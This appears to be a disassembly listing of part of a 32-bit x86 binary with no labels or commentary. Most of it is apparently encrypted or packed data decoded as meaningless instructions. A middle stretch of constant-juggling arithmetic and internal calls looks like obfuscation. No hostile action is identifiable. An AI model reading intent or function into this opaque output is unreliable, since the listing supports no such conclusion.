  40f786:	mul    DWORD PTR [ebx+ecx*8-0x3f2076b8]
  40f78d:	out    dx,eax
  40f78e:	pop    es
  40f78f:	jl     0x40f7bf
  40f791:	out    0x51,eax
  40f793:	imul   edx,ebp,0xfffffffb
  40f796:	add    DWORD PTR [edx+0x5b],0x83aa0c09
  40f79d:	sub    eax,0x25f7dd1b
  40f7a2:	mul    DWORD PTR [edi-0x385f1935]
  40f7a8:	sub    esp,DWORD PTR [ebx]
  40f7aa:	inc    eax
  40f7ab:	inc    edx
  40f7ac:	aaa    
  40f7ad:	fadd   st,st(7)
  40f7af:	and    al,0x3d
  40f7b1:	div    DWORD PTR [edx+0x17]
  40f7b4:	adc    DWORD PTR [edx-0x59],eax
  40f7b7:	inc    edx
  40f7b8:	outs   dx,BYTE PTR ds:[esi]
  40f7b9:	adc    al,0x1a
  40f7bb:	fnsave [esi+0x70]
  40f7be:	fsub   DWORD PTR [eax]
  40f7c0:	popa   
  40f7c1:	jnp    0x40f76d
  40f7c3:	sbb    al,0x3c
  40f7c5:	or     eax,0xcb2263b9
  40f7ca:	jl     0x40f77c
  40f7cc:	stos   BYTE PTR es:[edi],al
  40f7cd:	and    DWORD PTR [edi+0x6146ce4c],esp
  40f7d3:	outs   dx,BYTE PTR ds:[esi]
  40f7d4:	add    al,0x1b
  40f7d6:	or     esp,edx
  40f7d8:	stos   DWORD PTR es:[edi],eax
  40f7d9:	pusha  
  40f7da:	push   0xffffffb7
  40f7dc:	loope  0x40f7ef
  40f7de:	lds    edx,FWORD PTR [ebx+ecx*2-0x4d]
  40f7e2:	aas    
  40f7e3:	ja     0x40f771
  40f7e5:	aam    0x1
  40f7e7:	popf   
  40f7e8:	push   edi
  40f7e9:	mul    BYTE PTR [edx+0x17]
  40f7ec:	aaa    
  40f7ed:	lds    ebx,FWORD PTR [eax+0x6dc30952]
  40f7f3:	mov    eax,ds:0x9b30ec0a
  40f7f8:	cmp    DWORD PTR [esi-0xc],eax
  40f7fb:	mov    eax,DWORD PTR [esi]
  40f7fd:	add    ebx,edi
  40f7ff:	ins    BYTE PTR es:[edi],dx
  40f800:	xor    DWORD PTR [edx+eax*1],eax
  40f803:	add    bh,ch
  40f805:	or     al,0xac
  40f807:	and    BYTE PTR [esi],0xea
  40f80a:	iret   
  40f80b:	jae    0x40f78d
  40f80d:	shr    DWORD PTR [ebx+0x33],cl
  40f810:	inc    esi
  40f811:	int    0x78
  40f813:	or     DWORD PTR [ebx-0x74f4cdd2],ebx
  40f819:	dec    eax
  40f81a:	loop   0x40f889
  40f81c:	hlt    
  40f81d:	imul   esp,DWORD PTR [eax],0x64
  40f820:	or     esp,DWORD PTR [di+0x1db4]
  40f825:	or     DWORD PTR [edx+0x9],ebp
  40f828:	push   0x89f077aa
  40f82d:	fist   WORD PTR [edi-0x6debee19]
  40f833:	and    DWORD PTR [edi],eax
  40f835:	aaa    
  40f836:	aas    
  40f837:	fild   DWORD PTR [edx-0x61]
  40f83a:	xchg   esp,eax
  40f83b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f83c:	cmp    eax,0xddf7169a
  40f841:	aas    
  40f842:	jle    0x40f858
  40f844:	test   BYTE PTR ds:0x55812441,dh
  40f84a:	popf   
  40f84b:	pop    ebx
  40f84c:	adc    eax,0xa17d18e
  40f851:	inc    BYTE PTR [ecx+0x3ad68197]
  40f857:	sub    esi,esp
  40f859:	cld    
  40f85a:	dec    esi
  40f85b:	jb     0x40f7fd
  40f85d:	popa   
  40f85e:	sub    eax,0x5154e3ff
  40f863:	push   edi
  40f864:	jmp    edx
  40f866:	or     eax,0xad34df86
  40f86b:	repz or DWORD PTR [ebp-0x2b],edi
  40f86f:	add    eax,0x110a1b7f
  40f874:	bound  ebp,QWORD PTR [ecx]
  40f876:	adc    al,0x22
  40f878:	mov    esi,0x80523598
  40f87d:	push   0xacb556a1
  40f882:	xchg   edi,eax
  40f883:	outs   dx,DWORD PTR ds:[esi]
  40f884:	sbb    DWORD PTR [edx+0x25],0xffffffb8
  40f888:	jle    0x40f841
  40f88a:	outs   dx,BYTE PTR cs:[esi]
  40f88c:	test   al,0x6b
  40f88e:	aaa    
  40f88f:	repz sbb BYTE PTR ds:0xd15720b9,bh
  40f896:	inc    ecx
  40f897:	rcl    DWORD PTR [ebx],0x9e
  40f89a:	pop    ecx
  40f89b:	add    al,0x8f
  40f89d:	(bad)  
  40f89e:	aam    0x33
  40f8a0:	xchg   BYTE PTR [eax-0x2a],ah
  40f8a3:	hlt    
  40f8a4:	adc    ebx,esi
  40f8a6:	cmp    esi,DWORD PTR [ebx+ebp*4+0x32]
  40f8aa:	ds lahf 
  40f8ac:	jnp    0x40f8f9
  40f8ae:	mov    dl,0x20
  40f8b0:	mov    BYTE PTR [ebx],bh
  40f8b2:	mov    edi,0x7e1498d4
  40f8b7:	jns    0x40f893
  40f8b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8ba:	or     al,0x35
  40f8bc:	arpl   WORD PTR [esi+0x3be2756d],si
  40f8c2:	(bad)  
  40f8c3:	mov    ds:0x4620bf60,eax
  40f8c8:	xor    al,0xdb
  40f8ca:	call   0xdade9a68
  40f8cf:	pop    edx
  40f8d0:	mov    BYTE PTR ds:0x44e762db,dh
  40f8d6:	popf   
  40f8d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8d8:	xor    bl,BYTE PTR [ebp+0x26]
  40f8db:	js     0x40f85d
  40f8dd:	sub    eax,DWORD PTR [esi+0x3e2d2f2e]
  40f8e3:	push   ecx
  40f8e4:	enter  0xc982,0x10
  40f8e8:	jg     0x40f95f
  40f8ea:	scas   eax,DWORD PTR es:[edi]
  40f8eb:	xchg   ecx,eax
  40f8ec:	adc    al,0x3b
  40f8ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8ef:	mov    dl,BYTE PTR [esi-0x4d]
  40f8f2:	jnp    0x40f925
  40f8f4:	sub    al,0x25
  40f8f6:	stc    
  40f8f7:	ret    0x9c46
  40f8fa:	jecxz  0x40f945
  40f8fc:	cmc    
  40f8fd:	ja     0x40f89f
  40f8ff:	leave  
  40f900:	xchg   BYTE PTR [edx-0x6a],cl
  40f903:	out    dx,eax
  40f904:	jmp    0x86d:0x7111212
  40f90b:	pop    esp
  40f90c:	shl    BYTE PTR ds:0xc9613d90,0x38
  40f913:	aaa    
  40f914:	pop    edx
  40f915:	sbb    edi,DWORD PTR [eax-0x1588673]
  40f91b:	nop
  40f91c:	fmul   DWORD PTR [esi+0x350484b6]
  40f922:	pop    eax
  40f923:	test   BYTE PTR [ebx],0xdd
  40f926:	adc    ecx,0x3e
  40f929:	fsub   st,st(3)
  40f92b:	add    BYTE PTR [edi+0x1f],bl
  40f92e:	jae    0x40f95d
  40f930:	add    dl,dl
  40f932:	(bad)  
  40f933:	into   
  40f934:	pop    es
  40f935:	add    DWORD PTR [edx],edx
  40f937:	(bad)  
  40f939:	pop    es
  40f93a:	adc    dl,BYTE PTR [eax-0xacec7dc]
  40f940:	int3   
  40f941:	ret    0xa034
  40f944:	or     DWORD PTR [esi+0x57bb283e],0xcc05d418
  40f94e:	xchg   DWORD PTR [ebx-0x41],edx
  40f951:	mov    bl,0x33
  40f953:	cmc    
  40f954:	mov    edx,0x9f8ee331
  40f959:	call   0x1b44:0x63645a67
  40f960:	or     ecx,DWORD PTR ds:0x96bb28b4
  40f966:	leave  
  40f967:	push   esi
  40f968:	fist   WORD PTR [esi+ebx*1-0x781326cf]
  40f96f:	repz mov bh,0xf6
  40f972:	or     esi,ebp
  40f974:	test   al,0xe0
  40f976:	pushf  
  40f977:	cmp    ebx,esi
  40f979:	into   
  40f97a:	adc    eax,0x8444d829
  40f97f:	jno    0x40f9b2
  40f981:	pop    edi
  40f982:	lods   al,BYTE PTR ds:[esi]
  40f983:	(bad)  
  40f984:	push   esi
  40f985:	or     eax,0xaffe8c11
  40f98a:	cmp    bl,BYTE PTR ds:0xdb6cbb9a
  40f990:	retf   
  40f991:	jmp    0x40f941
  40f993:	sub    DWORD PTR [ebp-0x1fc48bcd],edi
  40f999:	cmc    
  40f99a:	test   DWORD PTR [ebp-0x58948cb1],edx
  40f9a0:	mov    DWORD PTR [eax+0x15236a4c],ebp
  40f9a6:	and    edi,DWORD PTR [ebx]
  40f9a8:	test   BYTE PTR [eax+ebx*4-0x25],ch
  40f9ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9ad:	xchg   esi,eax
  40f9ae:	mov    bh,0xda
  40f9b0:	inc    ebx
  40f9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9b2:	test   eax,ebp
  40f9b4:	lea    esi,[ecx+0x35020566]
  40f9ba:	adc    DWORD PTR [ebp+0x4e171e24],ebp
  40f9c0:	sbb    dl,BYTE PTR [ecx-0x34c41b5c]
  40f9c6:	mov    al,ds:0x7a2df7e0
  40f9cb:	cli    
  40f9cc:	daa    
  40f9cd:	add    ebx,ecx
  40f9cf:	xchg   ecx,eax
  40f9d0:	(bad)
  40f9d4:	bound  eax,QWORD PTR [esi+0xc5c4bbc]
  40f9da:	clc    
  40f9db:	adc    eax,0x2a816d3d
  40f9e0:	das    
  40f9e1:	lea    ebp,[ebx]
  40f9e3:	shl    DWORD PTR ds:0xc3e,0x89
  40f9ea:	inc    ebp
  40f9eb:	test   al,0xc7
  40f9ed:	inc    ebp
  40f9ee:	in     al,dx
  40f9ef:	mov    ebp,0x59000066
  40f9f4:	mov    DWORD PTR [ebp-0x4],ecx
  40f9f7:	mov    DWORD PTR [ebp-0x8],0x3374
  40f9fe:	mov    DWORD PTR [ebp-0xc],0x3c31
  40fa05:	mov    eax,DWORD PTR [ebp-0xc]
  40fa08:	mov    edx,DWORD PTR [ebp-0x8]
  40fa0b:	mov    esi,DWORD PTR [ebp-0x4]
  40fa0e:	xor    eax,edx
  40fa10:	xor    edx,edx
  40fa12:	div    esi
  40fa14:	mov    edx,DWORD PTR [ebp-0x14]
  40fa17:	and    eax,edx
  40fa19:	sub    eax,0x680
  40fa1e:	mov    DWORD PTR [ebp-0x24],eax
  40fa21:	mov    DWORD PTR [ebp-0x30],0x5f68
  40fa28:	mov    DWORD PTR [ebp-0x2c],0x398b
  40fa2f:	mov    DWORD PTR [ebp-0x4],0x5034
  40fa36:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40fa3d:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40fa44:	mov    DWORD PTR [ebp-0x14],0xee2
  40fa4b:	mov    eax,DWORD PTR [ebp-0x14]
  40fa4e:	add    eax,DWORD PTR [ebp-0xc]
  40fa51:	mov    edx,DWORD PTR [ebp-0x8]
  40fa54:	xor    eax,edx
  40fa56:	mov    edx,DWORD PTR [ebp-0x4]
  40fa59:	or     eax,edx
  40fa5b:	mov    edx,DWORD PTR [ebp-0x2c]
  40fa5e:	or     eax,edx
  40fa60:	mov    edx,DWORD PTR [ebp-0x30]
  40fa63:	and    eax,edx
  40fa65:	mov    edx,0x5b68
  40fa6a:	sub    edx,eax
  40fa6c:	mov    DWORD PTR [ebp-0x24],edx
  40fa6f:	mov    DWORD PTR [ebp-0x48],0x3308
  40fa76:	mov    DWORD PTR [ebp-0x44],0x59a4
  40fa7d:	mov    DWORD PTR [ebp-0x38],0x2775
  40fa84:	mov    DWORD PTR [ebp-0x34],0x4da
  40fa8b:	mov    DWORD PTR [ebp-0x40],0x49d8
  40fa92:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40fa99:	mov    DWORD PTR [ebp-0x28],0x338c
  40faa0:	mov    DWORD PTR [ebp-0x24],0x68ed
  40faa7:	mov    DWORD PTR [ebp-0x20],0x2a7b
  40faae:	mov    DWORD PTR [ebp-0x1c],0x718f
  40fab5:	mov    eax,DWORD PTR [ebp-0x20]
  40fab8:	mov    edx,DWORD PTR [ebp-0x1c]
  40fabb:	mov    esi,DWORD PTR [ebp-0x28]
  40fabe:	mov    ebx,DWORD PTR [ebp-0x24]
  40fac1:	add    eax,0xffffc948
  40fac6:	adc    edx,0xffff87b0
  40facc:	or     eax,esi
  40face:	mov    esi,DWORD PTR [ebp-0x40]
  40fad1:	or     eax,esi
  40fad3:	or     edx,ebx
  40fad5:	mov    ebx,DWORD PTR [ebp-0x3c]
  40fad8:	mov    esi,DWORD PTR [ebp-0x38]
  40fadb:	or     edx,ebx
  40fadd:	mov    ebx,DWORD PTR [ebp-0x34]
  40fae0:	sub    eax,esi
  40fae2:	mov    esi,DWORD PTR [ebp-0x48]
  40fae5:	sbb    edx,ebx
  40fae7:	mov    ebx,DWORD PTR [ebp-0x44]
  40faea:	or     eax,esi
  40faec:	or     edx,ebx
  40faee:	add    eax,0x89b
  40faf3:	mov    DWORD PTR [ebp-0x20],eax
  40faf6:	adc    edx,0x5a
  40faf9:	mov    DWORD PTR [ebp-0x1c],edx
  40fafc:	mov    DWORD PTR [ebp-0x80],0xfa4
  40fb03:	mov    DWORD PTR [ebp-0x70],0x618e
  40fb0a:	mov    DWORD PTR [ebp-0x6c],0x811
  40fb11:	mov    DWORD PTR [ebp-0x98],0x42d6904a
  40fb1b:	mov    DWORD PTR [ebp-0x94],0xe82c1
  40fb25:	mov    DWORD PTR [ebp-0x88],0x58ff
  40fb2f:	mov    DWORD PTR [ebp-0x84],0x7394
  40fb39:	xor    eax,eax
  40fb3b:	inc    eax
  40fb3c:	mov    DWORD PTR [ebp-0x64],eax
  40fb3f:	mov    DWORD PTR [ebp-0x8],0x5f59
  40fb46:	mov    DWORD PTR [ebp-0x4],0x652b
  40fb4d:	mov    DWORD PTR [ebp-0xc],0xf43
  40fb54:	mov    DWORD PTR [ebp-0x14],0x22dc
  40fb5b:	mov    DWORD PTR [ebp-0x2c],0x45d4
  40fb62:	mov    DWORD PTR [ebp-0x30],0x28e1
  40fb69:	mov    DWORD PTR [ebp-0x7c],0x5e09
  40fb70:	mov    DWORD PTR [ebp-0x50],0x3910
  40fb77:	mov    DWORD PTR [ebp-0x3c],0x5c97
  40fb7e:	mov    DWORD PTR [ebp-0x24],0x6111
  40fb85:	mov    DWORD PTR [ebp-0x78],ecx
  40fb88:	mov    DWORD PTR [ebp-0x34],ecx
  40fb8b:	mov    DWORD PTR [ebp-0x44],0x207a
  40fb92:	mov    DWORD PTR [ebp-0x60],eax
  40fb95:	mov    DWORD PTR [ebp-0x8c],0x7840
  40fb9f:	mov    DWORD PTR [ebp-0x4c],0x6b0b
  40fba6:	mov    eax,DWORD PTR [ebp-0x30]
  40fba9:	or     eax,0x70c5
  40fbae:	add    eax,DWORD PTR [ebp-0x2c]
  40fbb1:	mov    ecx,DWORD PTR [ebp-0x14]
  40fbb4:	or     eax,ecx
  40fbb6:	mov    ecx,0xce40
  40fbbb:	sub    ecx,eax
  40fbbd:	mov    eax,DWORD PTR [ebp-0xc]
  40fbc0:	sub    ecx,eax
  40fbc2:	imul   ecx,ecx,0x7480
  40fbc8:	add    ecx,DWORD PTR [ebp-0x58]
  40fbcb:	mov    eax,DWORD PTR [ebp-0x8]
  40fbce:	push   ecx
  40fbcf:	mov    ecx,DWORD PTR [ebp-0x4]
  40fbd2:	lea    eax,[ecx+eax*1-0x1e6d]
  40fbd9:	mov    ecx,DWORD PTR [ebp-0x64]
  40fbdc:	xor    edx,edx
  40fbde:	div    ecx
  40fbe0:	mov    ecx,DWORD PTR [ebp-0x74]
  40fbe3:	lea    eax,[eax+ecx*1-0xa617]
  40fbea:	push   eax
  40fbeb:	mov    eax,DWORD PTR [ebp-0x88]
  40fbf1:	mov    ecx,DWORD PTR [ebp-0x84]
  40fbf7:	push   0x770a
  40fbfc:	push   0x2a0c
  40fc01:	push   ecx
  40fc02:	push   eax
  40fc03:	call   0x416c20
  40fc08:	mov    ecx,DWORD PTR [ebp-0x98]
  40fc0e:	mov    esi,DWORD PTR [ebp-0x94]
  40fc14:	push   esi
  40fc15:	push   ecx
  40fc16:	or     edx,0x615d
  40fc1c:	or     eax,0x455c
  40fc21:	push   edx
  40fc22:	push   eax
  40fc23:	call   0x422031
  40fc28:	mov    ecx,DWORD PTR [ebp-0x70]
  40fc2b:	mov    edx,DWORD PTR [ebp-0x6c]
  40fc2e:	xor    eax,ecx
  40fc30:	mov    ecx,DWORD PTR [ebp-0x20]
  40fc33:	mov    edx,DWORD PTR [ebp-0x1c]
  40fc36:	mov    esi,DWORD PTR [ebp-0x80]
  40fc39:	and    eax,0xb49
  40fc3e:	add    esi,0x629b
  40fc44:	lea    eax,[eax+ecx*1-0xfd]
  40fc4b:	xor    esi,0x4994
  40fc51:	push   eax
  40fc52:	lea    esi,[ebp+esi*1-0x3c93]
  40fc59:	call   0x41066f
  40fc5e:	mov    ecx,eax
  40fc60:	mov    eax,DWORD PTR [ebp-0x50]
  40fc63:	mov    edx,DWORD PTR [ebp-0x7c]
  40fc66:	sub    eax,0x161
  40fc6b:	xor    eax,edx
  40fc6d:	imul   eax,eax,0x5151
  40fc73:	jmp    0x40ff41
  40fc78:	fiadd  WORD PTR [edi-0x46]
  40fc7b:	rcr    DWORD PTR [edx],1
  40fc7d:	dec    esp
  40fc7e:	fisub  DWORD PTR [esi]
  40fc80:	out    dx,eax
  40fc81:	mov    bl,BYTE PTR [ebp-0x447b6890]
  40fc87:	mov    al,0x76
  40fc89:	sahf   
  40fc8a:	sbb    BYTE PTR [eax],bl
  40fc8c:	mov    esi,0xc8181814
  40fc91:	stos   BYTE PTR es:[edi],al
  40fc92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc93:	xor    edi,edx
  40fc95:	sbb    dl,BYTE PTR [eax]
  40fc97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc98:	fbstp  TBYTE PTR [eax]
  40fc9a:	mov    esi,0xd38e6768
  40fc9f:	(bad)  
  40fca0:	dec    edi
  40fca1:	(bad)  
  40fca2:	pop    edi
  40fca3:	jo     0x40fd1d
  40fca5:	mov    dh,0xf0
  40fca7:	stos   DWORD PTR es:[edi],eax
  40fca8:	add    al,0xdb
  40fcaa:	mov    al,ds:0x94717e76
  40fcaf:	sar    esp,1
  40fcb1:	mov    ch,0x6d
  40fcb3:	dec    ebx
  40fcb4:	sbb    eax,0xf17fc32b
  40fcb9:	or     dh,0x46
  40fcbc:	lock or eax,0x441f1012
  40fcc2:	frstor [ebp-0x35ade6a5]
  40fcc8:	push   ecx
  40fcc9:	mov    esi,0xf3becac2
  40fcce:	sub    ebp,esi
  40fcd0:	lods   eax,DWORD PTR ds:[esi]
  40fcd1:	repnz scas eax,DWORD PTR es:[edi]
  40fcd3:	dec    edx
  40fcd4:	adc    DWORD PTR [edx],0xf62caf6c
  40fcda:	jns    0x40fd11
  40fcdc:	add    BYTE PTR [esi+0x48],ch
  40fcdf:	outs   dx,BYTE PTR ds:[esi]
  40fce0:	dec    BYTE PTR [edx]
  40fce2:	sbb    edi,DWORD PTR [esi-0x66]
  40fce5:	push   es
  40fce6:	popf   
  40fce7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fce8:	les    edx,FWORD PTR [eax]
  40fcea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fceb:	daa    
  40fcec:	(bad)  
  40fced:	lea    edi,[ebp-0x28]
  40fcf0:	inc    ecx
  40fcf1:	jmp    0x23a11b1b
  40fcf6:	adc    al,0xbc
  40fcf9:	pop    ss
  40fcfa:	pop    ebx
  40fcfb:	fidiv  WORD PTR [ebx-0x4d5bde6d]
  40fd01:	cs loopne 0x40fd49
  40fd04:	cmp    esp,DWORD PTR [ebx+0x47b9d47a]
  40fd0a:	mov    ebx,0x18b564a8
  40fd0f:	jbe    0x40fd71
  40fd11:	cwde   
  40fd12:	sti    
  40fd13:	mov    ebx,0x2785828
  40fd18:	dec    edx
  40fd19:	ja     0x40fcb8
  40fd1b:	inc    ebx
  40fd1c:	jle    0x40fced
  40fd1e:	cli    
  40fd1f:	add    eax,0x1ab29424
  40fd24:	xor    al,ah
  40fd26:	xchg   ecx,eax
  40fd27:	jbe    0x40fd97
  40fd29:	push   ss
  40fd2a:	(bad)  
  40fd2b:	sbb    eax,0x4c31b510
  40fd30:	xor    eax,0xd4a0be93
  40fd35:	pop    eax
  40fd36:	pop    ebx
  40fd37:	cmp    DWORD PTR [eax-0x53f4816d],0x6d
  40fd3e:	xor    eax,0x9bb3e363
  40fd43:	stos   DWORD PTR es:[edi],eax
  40fd44:	mov    edx,0x346cac9b
  40fd49:	int3   
  40fd4a:	cmp    al,0x60
  40fd4c:	jns    0x40fdb0
  40fd4e:	rcr    BYTE PTR [edi-0xf4d8cb1],0x7f
  40fd55:	jl     0x40fd21
  40fd57:	out    0x2b,eax
  40fd59:	inc    edx
  40fd5a:	and    ebp,ebx
  40fd5c:	cli    
  40fd5d:	dec    esp
  40fd5e:	inc    esp
  40fd5f:	fnstsw WORD PTR [esi+0x63]
  40fd62:	adc    esp,DWORD PTR [edx]
  40fd64:	std    
  40fd65:	loope  0x40fd06
  40fd67:	pop    ds
  40fd68:	jo     0x40fdad
  40fd6a:	es inc esi
  40fd6c:	les    eax,FWORD PTR [edx-0x3491c502]
  40fd72:	ror    DWORD PTR [edi+0x61],0x2e
  40fd76:	nop
  40fd77:	test   al,0x38
  40fd79:	adc    al,0xdf
  40fd7b:	inc    ecx
  40fd7c:	xchg   ebp,eax
  40fd7d:	inc    esp
  40fd7e:	fcmovnbe st,st(2)
  40fd80:	nop
  40fd81:	mov    al,0xc0
  40fd83:	and    dl,bl
  40fd85:	dec    edi
  40fd86:	or     DWORD PTR [ebx+0x7b9ce919],esi
  40fd8c:	dec    ebx
  40fd8d:	leave  
  40fd8e:	xchg   edx,eax
  40fd8f:	cwde   
  40fd90:	je     0x40fd48
  40fd92:	cmp    cl,ah
  40fd94:	push   esi
  40fd95:	ins    BYTE PTR es:[edi],dx
  40fd96:	xor    DWORD PTR [edx+ecx*2],esp
  40fd99:	pusha  
  40fd9a:	(bad)  
  40fd9b:	in     eax,0x3c
  40fd9d:	or     DWORD PTR [esp+ebp*8],ebp
  40fda0:	sbb    esi,DWORD PTR [edx-0x38]
  40fda3:	mov    esi,0x37b4dd9b
  40fda8:	shr    DWORD PTR [eax-0x53],1
  40fdab:	cmc    
  40fdac:	std    
  40fdad:	mov    ds:0x595d8719,eax
  40fdb2:	cdq    
  40fdb3:	jl     0x40fd74
  40fdb5:	data16 xor al,dl
  40fdb8:	fndisi(8087 only) 
  40fdba:	xchg   edx,eax
  40fdbb:	add    ah,dh
  40fdbd:	gs mov bl,0x7c
  40fdc0:	pop    esi
  40fdc1:	dec    esp
  40fdc2:	repz bound eax,QWORD PTR [eax+0x2b]
  40fdc6:	scas   al,BYTE PTR es:[edi]
  40fdc7:	add    BYTE PTR [edx],al
  40fdc9:	fdivp  st(6),st
  40fdcb:	js     0x40fe19
  40fdcd:	pop    ebp
  40fdce:	jnp    0x40fdf6
  40fdd0:	jmp    0x40fe30
  40fdd2:	jp     0x40fe39
  40fdd4:	cmp    al,0x81
  40fdd6:	mov    ecx,0x2963f2e1
  40fddb:	xor    ecx,ebp
  40fddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdde:	loopne 0x40fddf
  40fde0:	push   ebp
  40fde1:	rcl    DWORD PTR [ebp-0x30997963],0x18
  40fde8:	cs enter 0xc64b,0x1f
  40fded:	aad    0xba
  40fdef:	push   es
  40fdf0:	push   ss
  40fdf1:	and    al,0x34
  40fdf3:	and    edx,DWORD PTR [edx+0x71]
  40fdf6:	test   DWORD PTR [ebx-0x56cc944a],ecx
  40fdfc:	mov    dl,0x2f
  40fdfe:	je     0x40fddf
  40fe00:	test   DWORD PTR [ebp-0x852f1ce],edx
  40fe06:	aas    
  40fe07:	lods   eax,DWORD PTR ds:[esi]
  40fe08:	ins    BYTE PTR es:[edi],dx
  40fe09:	aas    
  40fe0a:	dec    bl
  40fe0c:	jle    0x40fde7
  40fe0e:	ficom  WORD PTR [ecx-0x48646835]
  40fe14:	mov    ds:0xd101a60,eax
  40fe19:	lahf   
  40fe1a:	pop    ds
  40fe1b:	aaa    
  40fe1c:	aas    
  40fe1d:	inc    ebx
  40fe1e:	sbb    dh,BYTE PTR [eax]
  40fe20:	push   0x4
  40fe22:	xor    eax,0xb7c86646
  40fe27:	fnstenv [eax]
  40fe29:	call   DWORD PTR [esi]
  40fe2b:	inc    ebx
  40fe2c:	inc    esp
  40fe2d:	(bad)  
  40fe2e:	sub    BYTE PTR [ecx-0x1b],bl
  40fe31:	and    ebp,DWORD PTR [ebx-0x6d]
  40fe34:	test   DWORD PTR [edx-0x6e],0x705dbb68
  40fe3b:	push   cs
  40fe3c:	mov    ch,0x3e
  40fe3e:	adc    eax,0x95e22a42
  40fe43:	push   ecx
  40fe44:	mov    ch,0x1f
  40fe46:	stc    
  40fe47:	mov    ch,0x33
  40fe49:	mov    ch,0x13
  40fe4b:	pop    edx
  40fe4c:	ins    DWORD PTR es:[edi],dx
  40fe4d:	add    esp,DWORD PTR [edi-0x77]
  40fe50:	dec    edx
  40fe51:	dec    bx
  40fe53:	pop    ecx
  40fe54:	cld    
  40fe55:	aam    0x55
  40fe57:	sub    DWORD PTR ds:0xe562416b,edx
  40fe5d:	in     eax,0x6c
  40fe5f:	mov    al,ds:0x1b8fd822
  40fe64:	int3   
  40fe65:	dec    ecx
  40fe66:	inc    ebx
  40fe67:	inc    ebx
  40fe68:	aad    0x33
  40fe6a:	fist   WORD PTR [ecx]
  40fe6c:	sar    BYTE PTR [esi+0x28],1
  40fe6f:	mov    ecx,0xad93f65f
  40fe74:	lods   eax,DWORD PTR ds:[esi]
  40fe75:	cmp    DWORD PTR [ecx-0x709b6bdc],ebp
  40fe7b:	mov    ah,dl
  40fe7d:	xchg   edx,eax
  40fe7e:	pusha  
  40fe7f:	in     eax,dx
  40fe80:	cmp    eax,0x3b823739
  40fe85:	cmp    edx,DWORD PTR [edi+0x1f1a7dff]
  40fe8b:	lods   eax,DWORD PTR ds:[esi]
  40fe8c:	mov    ebx,0xa5068308
  40fe91:	lahf   
  40fe92:	or     esi,DWORD PTR [ebx]
  40fe94:	test   al,0x59
  40fe96:	scas   eax,DWORD PTR es:[edi]
  40fe97:	mov    edi,0x4957492d
  40fe9c:	(bad)  
  40fe9d:	jne    0x40fe99
  40fe9f:	test   al,0x96
  40fea1:	xor    dl,BYTE PTR [edx+0x5d]
  40fea4:	test   DWORD PTR [edi],eax
  40fea6:	lods   eax,DWORD PTR ds:[esi]
  40fea7:	inc    ebx
  40fea8:	mov    bh,0xab
  40feaa:	outs   dx,DWORD PTR ds:[esi]
  40feab:	mov    ebp,DWORD PTR [edi+0x3f]
  40feae:	jns    0x40fed6
  40feb0:	(bad)  
  40feb1:	mov    ?,ebp
  40feb3:	inc    edi
  40feb4:	push   cs
  40feb5:	mov    ch,0xd9
  40feb7:	stos   DWORD PTR es:[edi],eax
  40feb8:	sbb    DWORD PTR [ebx+esi*8-0x32],ebp
  40febc:	and    dl,BYTE PTR [esi-0x73]
  40febf:	jecxz  0x40ff0f
  40fec1:	inc    edx
  40fec2:	or     esi,eax
  40fec4:	pop    edi
  40fec5:	in     eax,dx
  40fec6:	sbb    edi,DWORD PTR [esi+0x4d]
  40fec9:	xchg   ebx,eax
  40feca:	aam    0x60
  40fecc:	mov    ebp,0xab8b8e38
  40fed1:	adc    DWORD PTR [ecx-0x38],eax
  40fed4:	popf   
  40fed5:	push   edi
  40fed6:	sub    edi,ebx
  40fed8:	leave  
  40fed9:	cmp    DWORD PTR [esi+0x58],ebp
  40fedc:	std    
  40fedd:	adc    bh,BYTE PTR [esi-0x27]
  40fee0:	pop    es
  40fee1:	mul    BYTE PTR ds:0x4e1fe626
  40fee7:	mov    edi,ebp
  40fee9:	clc    
  40feea:	pop    edi
  40feeb:	push   ds
  40feec:	imul   esp,DWORD PTR [esi+0x6c],0x8091282a
  40fef3:	mov    edi,0xb6f02d6a
  40fef8:	ja     0x40fece
  40fefa:	call   0x38e9:0xc47844ad
  40ff01:	mov    ds:0x620008a4,eax
  40ff06:	or     dh,BYTE PTR [ebp-0x35dbc295]
  40ff0c:	imul   bh
  40ff0e:	clc    
  40ff0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff10:	jp     0x40ff44
  40ff12:	mov    WORD PTR [ebx],cs
  40ff14:	sub    BYTE PTR [ecx+0x7e],al
  40ff17:	fcomp  DWORD PTR [ebx-0x7e291b86]
  40ff1d:	mov    eax,0xf10b872d
  40ff22:	and    eax,0x1f0447a4
  40ff27:	mov    ch,BYTE PTR [ecx]
  40ff29:	fs pop ds
  40ff2b:	cld    
  40ff2c:	mov    ds:0xbd683d6b,al
  40ff31:	sahf   
  40ff32:	jmp    0x84d897fa
  40ff37:	pop    ebp
  40ff38:	xor    esi,DWORD PTR [edx+0x4b8b455]
  40ff3e:	pop    ss
  40ff3f:	cmp    ebx,DWORD PTR [ebx+0x5]
  40ff42:	add    DWORD PTR [ecx],edi
  40ff44:	add    BYTE PTR [eax],al
  40ff46:	xor    eax,0x40c2
  40ff4b:	xor    edx,edx
  40ff4d:	mov    esi,0x218f6c45
  40ff52:	div    esi
  40ff54:	cmp    ecx,eax
  40ff56:	jmp    0x410224
  40ff5b:	ss int 0x1f
  40ff5e:	jnp    0x40ff7a
  40ff60:	pop    ebx
  40ff61:	xor    bl,BYTE PTR [ebp+ebx*1+0x27c73b9]
  40ff68:	dec    ebp
  40ff69:	in     eax,0xaa
  40ff6b:	sbb    eax,0xbe181898
  40ff70:	adc    al,0x18
  40ff72:	sbb    BYTE PTR [ecx],bl
  40ff74:	or     al,0x3b
